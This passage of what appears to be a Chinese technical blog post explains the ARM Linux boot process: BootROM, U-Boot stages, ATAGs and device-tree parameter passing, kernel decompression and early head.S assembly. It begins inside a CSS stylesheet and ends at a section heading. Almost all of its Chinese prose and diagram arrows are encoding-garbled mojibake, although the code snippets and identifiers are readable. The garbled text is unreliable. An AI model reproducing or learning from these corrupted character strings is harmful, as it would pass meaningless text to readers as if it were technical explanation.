New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. ç³»ç»Ÿå¯åŠ¨æ¦‚è¿°</h2>
<h3 data-id="heading-1">1.1 å¯åŠ¨æµç¨‹æ€»è§ˆ</h3>
<p>Linuxç³»ç»Ÿå¯åŠ¨æ˜¯ä¸€ä¸ªå¤šé˜¶æ®µçš„è¿‡ç¨‹ï¼Œä»ç¡¬ä»¶ä¸Šç”µåˆ°ç”¨æˆ·ç©ºé—´åº”ç”¨è¿è¡Œï¼Œç»å†äº†ä»¥ä¸‹ä¸»è¦é˜¶æ®µï¼š</p>
<pre><code class="hljs language-scss" lang="scss">ç¡¬ä»¶ä¸Šç”µ
    â†“
Bootloader (U-Boot/BootROM)
    â†“
å†…æ ¸è§£å‹ (å¦‚æœæ˜¯å‹ç¼©å†…æ ¸)
    â†“
å†…æ ¸æ—©æœŸæ±‡ç¼–åˆå§‹åŒ– (head.S)
    â†“
Cè¯­è¨€åˆå§‹åŒ– (start_kernel)
    â†“
å­ç³»ç»Ÿåˆå§‹åŒ– (initcalls)
    â†“
Initè¿›ç¨‹å¯åŠ¨
    â†“
ç”¨æˆ·ç©ºé—´åº”ç”¨å¯åŠ¨
</code></pre>
<h3 data-id="heading-2">1.2 å„é˜¶æ®µçš„ä½œç”¨</h3>
<ol>
<li><strong>ç¡¬ä»¶ä¸Šç”µ</strong>: CPUä»å›ºå®šåœ°å€å¼€å§‹æ‰§è¡Œ</li>
<li><strong>Bootloader</strong>: åˆå§‹åŒ–ç¡¬ä»¶ï¼ŒåŠ è½½å†…æ ¸</li>
<li><strong>å†…æ ¸è§£å‹</strong>: è§£å‹å‹ç¼©çš„å†…æ ¸é•œåƒ</li>
<li><strong>æ±‡ç¼–åˆå§‹åŒ–</strong>: è®¾ç½®CPUã€MMUã€é¡µè¡¨ç­‰åº•å±‚è®¾æ–½</li>
<li><strong>Cè¯­è¨€åˆå§‹åŒ–</strong>: åˆå§‹åŒ–å†…æ ¸å„ä¸ªå­ç³»ç»Ÿ</li>
<li><strong>Initè¿›ç¨‹</strong>: ç¬¬ä¸€ä¸ªç”¨æˆ·ç©ºé—´è¿›ç¨‹ï¼Œå¯åŠ¨å…¶ä»–åº”ç”¨</li>
</ol>
<h3 data-id="heading-3">1.3 å…³é”®æ–‡ä»¶ä½ç½®</h3>
<ul>
<li><strong>Bootloader</strong>: <code>arch/arm/boot/compressed/head.S</code> (å‹ç¼©å†…æ ¸å…¥å£)</li>
<li><strong>å†…æ ¸å…¥å£</strong>: <code>arch/arm/kernel/head.S</code> (å†…æ ¸ä¸»å…¥å£)</li>
<li><strong>Cè¯­è¨€å…¥å£</strong>: <code>init/main.c</code> (start_kernelå‡½æ•°)</li>
<li><strong>Initè¿›ç¨‹</strong>: <code>init/main.c</code> (kernel_initå‡½æ•°)</li>
</ul>
<hr/>
<h2 data-id="heading-4">2. ç¡¬ä»¶ä¸Šç”µé˜¶æ®µ</h2>
<h3 data-id="heading-5">2.1 ä¸Šç”µå¤ä½</h3>
<h4 data-id="heading-6">2.1.1 å¤ä½å‘é‡</h4>
<p>å½“ç³»ç»Ÿä¸Šç”µæˆ–å¤ä½æ—¶ï¼ŒCPUä¼šä»<strong>å¤ä½å‘é‡</strong>ï¼ˆReset Vectorï¼‰åœ°å€å¼€å§‹æ‰§è¡Œä»£ç ã€‚</p>
<p><strong>ARMæ¶æ„çš„å¤ä½å‘é‡</strong>:</p>
<ul>
<li><strong>åœ°å€</strong>: é€šå¸¸æ˜¯ <code>0x00000000</code> æˆ– <code>0xFFFF0000</code>ï¼ˆå–å†³äºé…ç½®ï¼‰</li>
<li><strong>å†…å®¹</strong>: ä¸€æ¡è·³è½¬æŒ‡ä»¤ï¼Œè·³è½¬åˆ°Bootloaderä»£ç </li>
</ul>
<h4 data-id="heading-7">2.1.2 å¤ä½åçš„CPUçŠ¶æ€</h4>
<p>å¤ä½åï¼ŒCPUå¤„äºä»¥ä¸‹çŠ¶æ€ï¼š</p>
<ol>
<li><strong>MMUå…³é—­</strong>: å†…å­˜ç®¡ç†å•å…ƒæœªå¯ç”¨ï¼Œä½¿ç”¨ç‰©ç†åœ°å€</li>
<li><strong>Cacheå…³é—­</strong>: ç¼“å­˜æœªå¯ç”¨</li>
<li><strong>ä¸­æ–­å…³é—­</strong>: æ‰€æœ‰ä¸­æ–­è¢«ç¦ç”¨</li>
<li><strong>ç‰¹æƒæ¨¡å¼</strong>: é€šå¸¸å¤„äºSupervisoræ¨¡å¼ï¼ˆARMï¼‰æˆ–ç±»ä¼¼ç‰¹æƒæ¨¡å¼</li>
<li><strong>å¯„å­˜å™¨</strong>: å¤§éƒ¨åˆ†å¯„å­˜å™¨æœªå®šä¹‰ï¼Œéœ€è¦åˆå§‹åŒ–</li>
</ol>
<h4 data-id="heading-8">2.1.3 ä¸ºä»€ä¹ˆéœ€è¦Bootloaderï¼Ÿ</h4>
<p>CPUå¤ä½ååªèƒ½æ‰§è¡Œç®€å•çš„æŒ‡ä»¤ï¼Œæ— æ³•ç›´æ¥ï¼š</p>
<ul>
<li>è®¿é—®å¤æ‚çš„å­˜å‚¨è®¾å¤‡ï¼ˆå¦‚eMMCã€NAND Flashï¼‰</li>
<li>è§£ææ–‡ä»¶ç³»ç»Ÿ</li>
<li>åŠ è½½å’ŒéªŒè¯å†…æ ¸é•œåƒ</li>
<li>è®¾ç½®å¤æ‚çš„ç¡¬ä»¶é…ç½®</li>
</ul>
<p>å› æ­¤éœ€è¦Bootloaderä½œä¸ºä¸­é—´å±‚ã€‚</p>
<h3 data-id="heading-9">2.2 BootROMé˜¶æ®µ</h3>
<h4 data-id="heading-10">2.2.1 ä»€ä¹ˆæ˜¯BootROMï¼Ÿ</h4>
<p>BootROMæ˜¯èŠ¯ç‰‡å†…éƒ¨å›ºåŒ–çš„åªè¯»å­˜å‚¨å™¨ï¼ŒåŒ…å«ï¼š</p>
<ul>
<li>èŠ¯ç‰‡å‚å•†æä¾›çš„å¯åŠ¨ä»£ç </li>
<li>åŸºæœ¬çš„ç¡¬ä»¶åˆå§‹åŒ–ä»£ç </li>
<li>ä»å­˜å‚¨è®¾å¤‡åŠ è½½Bootloaderçš„ä»£ç </li>
</ul>
<h4 data-id="heading-11">2.2.2 BootROMçš„å·¥ä½œæµç¨‹</h4>
<pre><code class="hljs language-markdown" lang="markdown">ä¸Šç”µå¤ä½
<span class="hljs-code">    â†“
æ‰§è¡ŒBootROMä»£ç 
    â†“
åˆå§‹åŒ–åŸºæœ¬ç¡¬ä»¶ï¼ˆæ—¶é’Ÿã€DDRç­‰ï¼‰
    â†“
ä»å­˜å‚¨è®¾å¤‡è¯»å–Bootloader
    â†“
éªŒè¯Bootloaderï¼ˆå¯é€‰ï¼‰
    â†“
è·³è½¬åˆ°Bootloader
</span></code></pre>
<h4 data-id="heading-12">2.2.3 BootROMçš„å­˜å‚¨ä½ç½®</h4>
<ul>
<li><strong>ä½ç½®</strong>: èŠ¯ç‰‡å†…éƒ¨ROMï¼Œä¸å¯ä¿®æ”¹</li>
<li><strong>å¤§å°</strong>: é€šå¸¸å‡ KBåˆ°å‡ åKB</li>
<li><strong>åŠŸèƒ½</strong>: æœ€å°åŒ–çš„å¯åŠ¨ä»£ç </li>
</ul>
<hr/>
<h2 data-id="heading-13">3. Bootloaderé˜¶æ®µ</h2>
<h3 data-id="heading-14">3.1 Bootloaderæ¦‚è¿°</h3>
<h4 data-id="heading-15">3.1.1 ä»€ä¹ˆæ˜¯Bootloaderï¼Ÿ</h4>
<p>Bootloaderæ˜¯ç³»ç»Ÿå¯åŠ¨çš„ç¬¬ä¸€ä¸ªè½¯ä»¶å±‚ï¼Œè´Ÿè´£ï¼š</p>
<ol>
<li><strong>ç¡¬ä»¶åˆå§‹åŒ–</strong>: åˆå§‹åŒ–CPUã€å†…å­˜ã€å­˜å‚¨ã€ä¸²å£ç­‰</li>
<li><strong>åŠ è½½å†…æ ¸</strong>: ä»å­˜å‚¨è®¾å¤‡è¯»å–å†…æ ¸é•œåƒ</li>
<li><strong>ä¼ é€’å‚æ•°</strong>: å‘å†…æ ¸ä¼ é€’è®¾å¤‡æ ‘ã€å‘½ä»¤è¡Œå‚æ•°ç­‰</li>
<li><strong>å¯åŠ¨å†…æ ¸</strong>: è·³è½¬åˆ°å†…æ ¸å…¥å£åœ°å€</li>
</ol>
<h4 data-id="heading-16">3.1.2 å¸¸è§çš„Bootloader</h4>
<ul>
<li><strong>U-Boot</strong>: æœ€å¸¸ç”¨çš„å¼€æºBootloader</li>
<li><strong>GRUB</strong>: ä¸»è¦ç”¨äºx86æ¶æ„</li>
<li><strong>RedBoot</strong>: åµŒå…¥å¼ç³»ç»Ÿå¸¸ç”¨</li>
<li><strong>BootROM</strong>: èŠ¯ç‰‡å‚å•†æä¾›çš„å›ºä»¶</li>
</ul>
<h4 data-id="heading-17">3.1.3 Bootloaderçš„å­˜å‚¨ä½ç½®</h4>
<ul>
<li><strong>NOR Flash</strong>: å¯ä»¥ç›´æ¥æ‰§è¡Œï¼ˆXIPï¼‰</li>
<li><strong>NAND Flash</strong>: éœ€è¦åŠ è½½åˆ°RAMæ‰§è¡Œ</li>
<li><strong>eMMC/SDå¡</strong>: éœ€è¦åŠ è½½åˆ°RAMæ‰§è¡Œ</li>
<li><strong>ç½‘ç»œ</strong>: é€šè¿‡ç½‘ç»œåŠ è½½ï¼ˆPXEã€TFTPç­‰ï¼‰</li>
</ul>
<h3 data-id="heading-18">3.2 U-Bootå¯åŠ¨æµç¨‹</h3>
<h4 data-id="heading-19">3.2.1 U-Bootçš„é˜¶æ®µåˆ’åˆ†</h4>
<p>U-Booté€šå¸¸åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š</p>
<p><strong>Stage 1 (SPL - Secondary Program Loader)</strong>:</p>
<ul>
<li>æœ€å°åŒ–çš„åˆå§‹åŒ–</li>
<li>åˆå§‹åŒ–DDRå†…å­˜</li>
<li>åŠ è½½å®Œæ•´çš„U-Bootåˆ°DDR</li>
</ul>
<p><strong>Stage 2 (Full U-Boot)</strong>:</p>
<ul>
<li>å®Œæ•´çš„ç¡¬ä»¶åˆå§‹åŒ–</li>
<li>æ–‡ä»¶ç³»ç»Ÿæ”¯æŒ</li>
<li>ç½‘ç»œæ”¯æŒ</li>
<li>åŠ è½½å†…æ ¸</li>
</ul>
<h4 data-id="heading-20">3.2.2 U-Bootçš„ä¸»è¦ä»»åŠ¡</h4>
<ol>
<li>
<p><strong>ç¡¬ä»¶åˆå§‹åŒ–</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// åˆå§‹åŒ–æ—¶é’Ÿ</span>
clock_init();

<span class="hljs-comment">// åˆå§‹åŒ–DDR</span>
ddr_init();

<span class="hljs-comment">// åˆå§‹åŒ–ä¸²å£ï¼ˆç”¨äºè°ƒè¯•è¾“å‡ºï¼‰</span>
uart_init();

<span class="hljs-comment">// åˆå§‹åŒ–å­˜å‚¨è®¾å¤‡</span>
storage_init();
</code></pre>
</li>
<li>
<p><strong>åŠ è½½å†…æ ¸é•œåƒ</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ä»å­˜å‚¨è®¾å¤‡è¯»å–å†…æ ¸</span>
load_kernel_image();

<span class="hljs-comment">// éªŒè¯å†…æ ¸ï¼ˆå¯é€‰ï¼‰</span>
verify_kernel();

<span class="hljs-comment">// è§£å‹å†…æ ¸ï¼ˆå¦‚æœæ˜¯å‹ç¼©é•œåƒï¼‰</span>
decompress_kernel();
</code></pre>
</li>
<li>
<p><strong>å‡†å¤‡å¯åŠ¨å‚æ•°</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// å‡†å¤‡è®¾å¤‡æ ‘ï¼ˆDevice Treeï¼‰</span>
setup_fdt();

<span class="hljs-comment">// å‡†å¤‡å‘½ä»¤è¡Œå‚æ•°</span>
setup_cmdline();

<span class="hljs-comment">// å‡†å¤‡ATAGsï¼ˆæ—§å¼å‚æ•°ä¼ é€’æ–¹å¼ï¼‰</span>
setup_atags();
</code></pre>
</li>
<li>
<p><strong>è·³è½¬åˆ°å†…æ ¸</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// è®¾ç½®CPUçŠ¶æ€</span>
<span class="hljs-comment">// - å…³é—­MMU</span>
<span class="hljs-comment">// - å…³é—­Cache</span>
<span class="hljs-comment">// - è®¾ç½®å¯„å­˜å™¨</span>

<span class="hljs-comment">// è·³è½¬åˆ°å†…æ ¸å…¥å£</span>
jump_to_kernel();
</code></pre>
</li>
</ol>
<h3 data-id="heading-21">3.3 å†…æ ¸å¯åŠ¨å‚æ•°ä¼ é€’</h3>
<h4 data-id="heading-22">3.3.1 å‚æ•°ä¼ é€’æ–¹å¼</h4>
<p>Linuxå†…æ ¸æ”¯æŒä¸¤ç§å‚æ•°ä¼ é€’æ–¹å¼ï¼š</p>
<p><strong>1. ATAGs (ARM Tags) - æ—§å¼æ–¹å¼</strong></p>
<ul>
<li>ç”¨äºARMæ¶æ„çš„ä¼ ç»Ÿæ–¹å¼</li>
<li>é€šè¿‡å†…å­˜ä¸­çš„æ•°æ®ç»“æ„ä¼ é€’</li>
<li>é€æ­¥è¢«è®¾å¤‡æ ‘æ›¿ä»£</li>
</ul>
<p><strong>2. Device Tree (è®¾å¤‡æ ‘) - ç°ä»£æ–¹å¼</strong></p>
<ul>
<li>æè¿°ç¡¬ä»¶é…ç½®çš„æ ‘å½¢ç»“æ„</li>
<li>æ›´çµæ´»ï¼Œæ˜“äºç»´æŠ¤</li>
<li>ç°ä»£ARMç³»ç»Ÿçš„ä¸»æµæ–¹å¼</li>
</ul>
<h4 data-id="heading-23">3.3.2 ATAGsç»“æ„</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">atag_header</span> {</span>
    u32 size;      <span class="hljs-comment">// æ•´ä¸ªtagçš„å¤§å°ï¼ˆä»¥å­—ä¸ºå•ä½ï¼‰</span>
    u32 tag;       <span class="hljs-comment">// tagç±»å‹</span>
};

<span class="hljs-comment">// å¸¸è§çš„ATAGç±»å‹</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ATAG_CORE       0x54410001  <span class="hljs-comment">// æ ¸å¿ƒtag</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ATAG_MEM        0x54410002  <span class="hljs-comment">// å†…å­˜ä¿¡æ¯</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ATAG_CMDLINE    0x54410009  <span class="hljs-comment">// å‘½ä»¤è¡Œå‚æ•°</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ATAG_NONE       0x00000000  <span class="hljs-comment">// ç»“æŸæ ‡è®°</span></span>
</code></pre>
<h4 data-id="heading-24">3.3.3 Device Treeç»“æ„</h4>
<p>è®¾å¤‡æ ‘æ˜¯æè¿°ç¡¬ä»¶é…ç½®çš„æ ‘å½¢æ•°æ®ç»“æ„ï¼š</p>
<pre><code class="hljs language-dts" lang="dts">/dts-v1/;

/ {
    compatible = "allwinner,sunxi";
    
    memory@40000000 {
        device_type = "memory";
        reg = &lt;0x40000000 0x20000000&gt;;
    };
    
    cpus {
        cpu@0 {
            compatible = "arm,cortex-a7";
        };
    };
    
    uart0: serial@01c28000 {
        compatible = "allwinner,sunxi-uart";
        reg = &lt;0x01c28000 0x400&gt;;
    };
};
</code></pre>
<h4 data-id="heading-25">3.3.4 Bootloaderä¼ é€’ç»™å†…æ ¸çš„å¯„å­˜å™¨</h4>
<p>ARMæ¶æ„ä¸‹ï¼ŒBootloaderé€šè¿‡å¯„å­˜å™¨ä¼ é€’å‚æ•°ï¼š</p>
<ul>
<li><strong>r0</strong>: é€šå¸¸ä¸º0</li>
<li><strong>r1</strong>: æœºå™¨ç±»å‹IDï¼ˆMachine Type IDï¼‰</li>
<li><strong>r2</strong>: ATAGsæˆ–è®¾å¤‡æ ‘çš„ç‰©ç†åœ°å€</li>
</ul>
<p>è¿™äº›å¯„å­˜å™¨å€¼åœ¨å†…æ ¸å¯åŠ¨æ—¶ä¼šè¢«ä½¿ç”¨ã€‚</p>
<hr/>
<h2 data-id="heading-26">4. å†…æ ¸è§£å‹é˜¶æ®µ</h2>
<h3 data-id="heading-27">4.1 å‹ç¼©å†…æ ¸æ¦‚è¿°</h3>
<h4 data-id="heading-28">4.1.1 ä¸ºä»€ä¹ˆéœ€è¦å‹ç¼©ï¼Ÿ</h4>
<p>å†…æ ¸é•œåƒé€šå¸¸å¾ˆå¤§ï¼ˆå‡ MBåˆ°å‡ åMBï¼‰ï¼Œå‹ç¼©å¯ä»¥ï¼š</p>
<ul>
<li><strong>å‡å°‘å­˜å‚¨ç©ºé—´</strong>: èŠ‚çœFlashç©ºé—´</li>
<li><strong>åŠ å¿«åŠ è½½é€Ÿåº¦</strong>: å‡å°‘ä»å­˜å‚¨è®¾å¤‡è¯»å–çš„æ—¶é—´</li>
<li><strong>èŠ‚çœå†…å­˜</strong>: è§£å‹å‰å ç”¨æ›´å°‘å†…å­˜</li>
</ul>
<h4 data-id="heading-29">4.1.2 å‹ç¼©æ ¼å¼</h4>
<p>Linuxå†…æ ¸æ”¯æŒå¤šç§å‹ç¼©æ ¼å¼ï¼š</p>
<ul>
<li><strong>gzip</strong>: æœ€å¸¸ç”¨ï¼Œå‹ç¼©ç‡é«˜</li>
<li><strong>bzip2</strong>: å‹ç¼©ç‡æ›´é«˜ï¼Œä½†è§£å‹æ…¢</li>
<li><strong>lzma/xz</strong>: å‹ç¼©ç‡æœ€é«˜ï¼Œè§£å‹è¾ƒæ…¢</li>
<li><strong>lzo</strong>: å‹ç¼©ç‡ä½ï¼Œä½†è§£å‹å¿«</li>
</ul>
<h4 data-id="heading-30">4.1.3 å‹ç¼©å†…æ ¸çš„ç»“æ„</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-attr">[å‹ç¼©å†…æ ¸å¤´éƒ¨]</span>
    â†“
<span class="hljs-selector-attr">[è§£å‹ä»£ç ]</span> (arch/arm/boot/compressed/head.S)
    â†“
<span class="hljs-selector-attr">[å‹ç¼©çš„å†…æ ¸æ•°æ®]</span>
    â†“
<span class="hljs-selector-attr">[è§£å‹åçš„å†…æ ¸å¤§å°]</span> (å¯é€‰)
</code></pre>
<h3 data-id="heading-31">4.2 è§£å‹ä»£ç å…¥å£</h3>
<h4 data-id="heading-32">4.2.1 å…¥å£ç‚¹ä½ç½®</h4>
<p>å‹ç¼©å†…æ ¸çš„å…¥å£ç‚¹åœ¨ <code>arch/arm/boot/compressed/head.S</code>:</p>
<pre><code class="hljs language-assembly" lang="assembly">.section ".start", "ax"
.align
start:
    .type start,#function
    // è§£å‹ä»£ç ä»è¿™é‡Œå¼€å§‹
</code></pre>
<h4 data-id="heading-33">4.2.2 è§£å‹ä»£ç çš„ä¸»è¦ä»»åŠ¡</h4>
<ol>
<li>
<p><strong>ä¿å­˜Bootloaderä¼ é€’çš„å‚æ•°</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">// ä¿å­˜r0, r1, r2å¯„å­˜å™¨
// r1 = æœºå™¨ç±»å‹ID
// r2 = ATAGs/DTBåœ°å€
</code></pre>
</li>
<li>
<p><strong>è®¾ç½®æ ˆæŒ‡é’ˆ</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">// éœ€è¦æ ˆæ¥è°ƒç”¨Cå‡½æ•°
ldr sp, =stack_base
</code></pre>
</li>
<li>
<p><strong>æ£€æŸ¥æ˜¯å¦éœ€è¦è§£å‹</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">// æ£€æŸ¥å†…æ ¸æ˜¯å¦å·²è§£å‹
// å¦‚æœå·²è§£å‹ï¼Œç›´æ¥è·³è½¬
</code></pre>
</li>
<li>
<p><strong>è§£å‹å†…æ ¸</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// è°ƒç”¨è§£å‹å‡½æ•°</span>
decompress_kernel();
</code></pre>
</li>
<li>
<p><strong>è·³è½¬åˆ°è§£å‹åçš„å†…æ ¸</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">// è·³è½¬åˆ°å†…æ ¸å…¥å£
b   stext  // è·³è½¬åˆ°arch/arm/kernel/head.S
</code></pre>
</li>
</ol>
<h4 data-id="heading-34">4.2.3 è§£å‹è¿‡ç¨‹è¯¦è§£</h4>
<p>è§£å‹ä»£ç çš„å·¥ä½œæµç¨‹ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">start (å‹ç¼©å†…æ ¸å…¥å£)
    â†“
ä¿å­˜å¯„å­˜å™¨ (r0, r1, r2)
    â†“
è®¾ç½®æ ˆæŒ‡é’ˆ
    â†“
æ£€æŸ¥å†…æ ¸æ˜¯å¦å·²è§£å‹
    â”œâ”€ å·²è§£å‹ â†’ ç›´æ¥è·³è½¬
    â””â”€ æœªè§£å‹ â†’ ç»§ç»­
    â†“
è°ƒç”¨è§£å‹å‡½æ•° (Cä»£ç )
    â†“
è§£å‹å†…æ ¸åˆ°ç›®æ ‡åœ°å€
    â†“
éªŒè¯è§£å‹ç»“æœ
    â†“
è·³è½¬åˆ°å†…æ ¸å…¥å£ (stext)
</code></pre>
<h4 data-id="heading-35">4.2.4 è§£å‹å‡½æ•°å®ç°</h4>
<p>è§£å‹å‡½æ•°åœ¨ <code>arch/arm/boot/compressed/decompress.c</code>:</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">decompress_kernel</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> output_start,
                       <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> free_mem_ptr_p,
                       <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> free_mem_ptr_end_p,
                       <span class="hljs-type">int</span> arch_id)</span>
{
    <span class="hljs-comment">// é€‰æ‹©è§£å‹ç®—æ³•</span>
    <span class="hljs-comment">// è°ƒç”¨ç›¸åº”çš„è§£å‹å‡½æ•°</span>
    <span class="hljs-comment">// è§£å‹å†…æ ¸åˆ°output_start</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-36">5. å†…æ ¸æ—©æœŸæ±‡ç¼–åˆå§‹åŒ–</h2>
<h3 data-id="heading-37">5.1 å†…æ ¸å…¥å£ç‚¹</h3>
<h4 data-id="heading-38">5.1.1 å…¥å£ç‚¹ä½ç½®</h4>
<p>å†…æ ¸çš„æ±‡ç¼–å…¥å£ç‚¹åœ¨ <code>arch/arm/kernel/head.S</code>:</p>
<pre><code class="hljs language-assembly" lang="assembly">__HEAD
ENTRY(stext)
    // å†…æ ¸ä»è¿™é‡Œå¼€å§‹æ‰§è¡Œ
    // MMUå…³é—­ï¼Œä½¿ç”¨ç‰©ç†åœ°å€
</code></pre>
<h4 data-id="heading-39">5.1.2 å…¥å£æ—¶çš„CPUçŠ¶æ€</h4>
<p>å†…æ ¸å…¥å£æ—¶ï¼ŒCPUå¤„äºä»¥ä¸‹çŠ¶æ€ï¼š</p>
<ul>
<li><strong>MMU</strong>: å…³é—­</li>
<li><strong>Cache</strong>: å…³é—­</li>
<li><strong>ä¸­æ–­</strong>: å…³é—­</li>
<li><strong>å¯„å­˜å™¨</strong>:
<ul>
<li>r0 = 0</li>
<li>r1 = æœºå™¨ç±»å‹ID</li>
<li>r2 = ATAGs/DTBç‰©ç†åœ°å€</li>
</ul>
</li>
</ul>
<h4 data-id="heading-40">5.1.3 ä¸ºä»€ä¹ˆéœ€è¦æ±‡ç¼–åˆå§‹åŒ–ï¼Ÿ</h4>
<p>åœ¨å¯ç”¨MMUå’ŒCacheä¹‹å‰ï¼Œå¿…é¡»ä½¿ç”¨æ±‡ç¼–ä»£ç ï¼š</p>
<ul>
<li>Cç¼–è¯‘å™¨ç”Ÿæˆçš„ä»£ç ä¾èµ–æ ˆå’Œå…¨å±€å˜é‡</li>
<li>æ ˆå’Œå…¨å±€å˜é‡éœ€è¦MMUæ˜ å°„</li>
<li>å› æ­¤éœ€è¦æ±‡ç¼–ä»£ç å…ˆè®¾ç½®MMU</li>
</ul>
<h3 data-id="heading-41">5.2 å¤„ç†å™¨ç±»å‹æ£€æµ‹</h3>
<h4 data-id="heading-42">5.2.1 æ£€æµ‹ç›®çš„</h4>
<p>å†…æ ¸éœ€è¦çŸ¥é“è¿è¡Œåœ¨å“ªç§CPUä¸Šï¼Œä»¥ï¼š</p>
<ul>
<li>é€‰æ‹©æ­£ç¡®çš„CPUç‰¹å®šä»£ç </li>
<li>è®¾ç½®CPUç‰¹å®šçš„å¯„å­˜å™¨</li>
<li>å¯ç”¨CPUç‰¹å®šçš„åŠŸèƒ½</li>
</ul>
<h4 data-id="heading-43">5.2.2 æ£€æµ‹è¿‡ç¨‹</h4>
<pre><code class="hljs language-assembly" lang="assembly">// è¯»å–CPU ID
mrc p15, 0, r9, c0, c0    @ è¯»å–å¤„ç†å™¨IDåˆ°r9

// æŸ¥æ‰¾å¤„ç†å™¨ç±»å‹
bl  __lookup_processor_type  @ æŸ¥æ‰¾å¤„ç†å™¨ä¿¡æ¯

// æ£€æŸ¥æ˜¯å¦æ”¯æŒ
movs r10, r5              @ r5æ˜¯å¤„ç†å™¨ä¿¡æ¯æŒ‡é’ˆ
beq  __error_p             @ å¦‚æœä¸æ”¯æŒï¼ŒæŠ¥é”™
</code></pre>
<h4 data-id="heading-44">5.2.3 å¤„ç†å™¨ä¿¡æ¯ç»“æ„</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_info_list</span> {</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    cpu_val;      <span class="hljs-comment">// CPU IDå€¼</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    cpu_mask;     <span class="hljs-comment">// CPU IDæ©ç </span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>   __cpu_mm_mmu_flags;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>   __cpu_io_mmu_flags;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>   __cpu_flush;  <span class="hljs-comment">// ç¼“å­˜åˆ·æ–°å‡½æ•°</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>      *arch_name;
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>      *elf_name;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    elf_hwcap;
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>      *cpu_name;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">processor</span> *<span class="hljs-title">proc</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu_tlb_fns</span> *<span class="hljs-title">tlb</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu_user_fns</span> *<span class="hljs-title">user</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu_cache_fns</span> *<span class="hljs-title">cache</span>;</span>
};
</code></pre>
<h3 data-id="heading-45">5.3 ATAGs/DTBéªŒè¯</h3>
